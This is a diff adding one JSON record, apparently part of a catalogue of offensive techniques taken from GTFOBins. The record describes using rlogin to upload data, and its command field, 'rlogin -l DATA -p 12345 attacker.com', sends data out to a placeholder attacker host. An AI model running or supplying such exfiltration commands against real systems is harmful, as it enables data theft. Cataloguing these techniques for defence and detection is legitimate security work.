@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-rlogin-upload",
+  "name": "GTFOBins · rlogin (upload)",
+  "command": "rlogin -l DATA -p 12345 attacker.com",
+  "description": "Use rlogin to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "rlogin",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/rlogin/#upload",
+  "upstream_id": "rlogin/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/rlogin/"
+    }
+  ]
+}
